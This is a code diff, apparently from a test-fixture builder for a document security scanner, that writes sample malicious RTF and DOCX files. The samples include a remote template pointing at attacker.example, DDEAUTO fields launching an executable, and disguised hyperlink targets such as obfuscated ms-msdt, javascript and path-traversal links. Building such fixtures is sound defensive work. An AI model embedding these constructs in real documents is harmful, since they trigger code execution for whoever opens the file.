@@ -213,6 +213,13 @@ def build_v011(p):
     rtf = b"{\\rtf1{\\*\\template http://attacker.example/t.dotm}{\\field{\\*\\fldinst DDEAUTO c:\\\\x.exe x}{\\fldrslt r}}}"
     open(p("template.rtf"), "wb").write(rtf)
     open(p("rtf_named.docx"), "wb").write(b"{\\rtf1 hello}")
+    # v0.1.2: orphan instrText (no fldChar), DOCTYPE text inside a comment, look-alike links
+    docx(p("dde_orphan.docx"), body='<w:p><w:r><w:instrText> DDEAUTO c:\\\\x.exe x</w:instrText></w:r></w:p>')
+    docx(p("doctype_comment.docx"), body='<!-- see the <!DOCTYPE> docs --><w:p><w:r><w:t>ok</w:t></w:r></w:p>')
+    looks = "".join(rel("rId%d" % i, "hyperlink", t, True) for i, t in enumerate(
+        ["ms\u00admsdt:/id x", "\uff4ds-msdt:/x", "\uff4aavascript:alert(1)", "ms-ms\tdt:x", "%25252566ile://s/x",
+         "payload.exe", "..\\..\\x.exe"], 1))
+    docx(p("lookalike_links.docx"), doc_rels=looks)
 
 
 def canary_docx(path, port):
